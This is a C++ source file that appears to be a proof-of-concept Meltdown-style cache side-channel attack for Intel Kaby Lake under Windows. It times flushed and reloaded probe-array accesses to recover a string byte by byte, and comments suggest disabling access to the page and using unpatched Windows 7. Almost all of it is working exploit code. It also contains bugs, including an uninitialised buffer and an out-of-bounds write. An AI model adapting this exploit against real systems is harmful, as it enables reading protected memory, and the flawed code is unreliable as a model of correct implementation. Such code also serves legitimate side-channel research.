#include <intrin.h>
#include <Windows.h>
#include <stdio.h>

extern "C" void LoadProbe(char* target, char* probe);
extern "C" unsigned int MeasureMem(char* ptr);
extern "C" void FlushMemAsm(char* mem, size_t mem_size, char* data_to_replace, size_t _data_to_replace_size);

/* Tuned for Intel Kaby Lake (= Sky Lake) (i5-7300 HQ, 2.5 GHz locked, no Hyper Treading)
	Loopback buffer			64 µOps max, 30-40 average
	uOp cache				32 sets * 8 ways * 6 µOps/line, line assigned to 32-bytes block of code (8 sqrtpd's),
	Cache L1 instructions	Write-back
	ITLB					4 KB pages: 128 entries, 8-way / 2,4 MB: 8 entries, 8 ways
	Cache L1 data			32 KBs, 8 way, 64 sets, no cache bank conflicts,
							not possible to read and write simultaneously from addresses that are spaced by a multiple of 4 Kbytes
	DTLB					4 KB pages: 64 entries, 4-way / 2,4 MB: 32 entries, 4 ways
	STLB					4 KB + 2 MB pages: 1536 entries, 4-way
	Cache L2				256 KBs, 4 ways, 1024 sets per core, Write-back, Non-inclusive
	Cache L3				6 MBs shared by 4 cores, Write-back, Inclusive
	DRAM					DDR4 2400 MHz

	Loopback buffer			>=4 fused uOps/clock stable
	uOps cache				<=1 line/clock max *, >=4 µOps/clock
	Decoder					>=4 fused uOps/clock max
	L1I-prefetcher			16 bytes/clock max, latency 4
	L1						latency 4 (simple pointer), 5 cycles for complex addresses
	L2-L1(I/D)				64 bytes/clock max, latency 14 min
	L3-L2					32 bytes/clock max, latency 34-85

	sqrtsd					1 uOp, port 0, latency 18, Throughput 6 CPI

	Branch misspredistion	16-20 clocks
	Return misspredistion	~35 clocks
	Running code write		~350 clocks
	Subnormal result		~129 clocks

	Source: Intel Intrinsics guide, Agner Fog, Wikichip
*/
#define BITS_PER_PROBE 8
const size_t PROBE_CHUNCKS = 1 << (BITS_PER_PROBE);
extern "C" const size_t BITS_PROBE_DIFF;
const size_t BITS_PROBE_DIFF = 0xB; // perfect for Kaby, check also in .asm 
const size_t PROBE_CHUNCK_SIZE = 1 << (BITS_PROBE_DIFF);
const size_t PROBE_ARRAY_SIZE = PROBE_CHUNCKS * PROBE_CHUNCK_SIZE;	// 512 Kb

const size_t data_to_replace_size = PROBE_ARRAY_SIZE; // 

const size_t PAGE_SIZE = 4096;
const size_t cache_line_size = 64;
const size_t threshold_clocks = 100; // 44-46 clocks (movntdqa, 34 mov) if in cache, ~200 if not (Kaby Lake), 32-34 if no read
const size_t max_no_results = 4;

struct Result {
	bool succeeded;
	char res;
};

Result Measure(char* probe) {
	//unsigned int mins[PROBE_CHUNCKS];
	//memset(mins, 0xFF, PROBE_CHUNCKS);
	Result result;
	unsigned char mini = 0;
	unsigned int minv = 0xFFFF'FFFF;
	unsigned int minv_prev;
	// takes ~50k clocks in worse case
	for (size_t i = 0; i < PROBE_CHUNCKS; i++) {

		unsigned int diff = MeasureMem(probe+i* PROBE_CHUNCK_SIZE);

		if (diff < threshold_clocks) {
			printf("i = %u (%c), diff = %u\n", i, (char)i, diff);
			result = {true, (char)i};
			return result;
		}
			
		if (diff < minv) {
			minv_prev = minv;
			minv = diff;
			mini = i;
		}
	}
	printf("no result\n");
	printf("mini = %u, minv = %u, minv_prev = %u\n", (unsigned int)mini, minv, minv_prev);
	result = { false, (char)mini };
	return result;
}

void FlushMem(char* mem, size_t mem_size, char* data_to_replace, size_t _data_to_replace_size) {
	size_t i;
	for (i = 0; i < mem_size; i++) {
		_mm_clflush(mem + i);
		data_to_replace[i] = 1;
	}
	for (; i < _data_to_replace_size; i++) {
		data_to_replace[i] = 1;
	}
}

void main() {
	HANDLE hThread = GetCurrentThread();
	HANDLE hProc = GetCurrentProcess();
	SetThreadAffinityMask(hProc, 1);
	SetPriorityClass(hProc, REALTIME_PRIORITY_CLASS);
	SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

	char* probe = (char*)_aligned_malloc(PROBE_ARRAY_SIZE, cache_line_size);
	char* test = (char*)_aligned_malloc(PAGE_SIZE, PAGE_SIZE);
	static const char test_sourse[] = "Test string, read this, bla bla, any errors? Text text text.";
	char* data_to_replace;// = (char*)_aligned_malloc(data_to_replace_size, cache_line_size);
	strcpy(test, test_sourse);
	memset(probe, 0, PROBE_ARRAY_SIZE);		// make sure physical memory is allocated by OS
	//memset(data_to_replace, 1, data_to_replace_size);
	const size_t test_size = __crt_countof(test_sourse);
	char res[test_size];
	size_t test_len = test_size; // '\0' including
	DWORD old;

	// Windows 10 with KAISER update will exclude this page from page table, try win 7
	// VirtualProtect(test, PAGE_SIZE, PAGE_NOACCESS, &old);	// now we can not access this data

	for (size_t i = 0, no_res_count = 0; i < test_len; ) {
		UINT64 start = __rdtsc(), flush, probe_cl, stop;
		FlushMemAsm(probe, PROBE_ARRAY_SIZE, data_to_replace, data_to_replace_size);
		flush = __rdtsc();
		LoadProbe(test + i, probe);
		probe_cl = __rdtsc();
		Result res_probe = Measure(probe);
		stop = __rdtsc();
		if (res_probe.succeeded) {
			res[i] = res_probe.res;
			i++;
			no_res_count = 0;
		}
		else {
			no_res_count++;
			if (no_res_count > max_no_results) {
				res[i] = res_probe.res;
				printf("can not read this data (%c): %c\n", test_sourse[i], res[i]);
				i++;
				no_res_count = 0;
			}
		}

		//printf("flush: %llu, probe: %llu, measuer: %llu, total: %llu\n", flush - start, probe_cl - flush, stop - probe_cl, stop - start);
	}

	res[test_len + 1] = 0;
	printf("original string:\n%s\nMelted string:\n", test_sourse);
	for (size_t i = 0; i < test_len + 1; i++) {
		printf("%c", res[i]);
	}
	printf("\n");
	system("pause");
}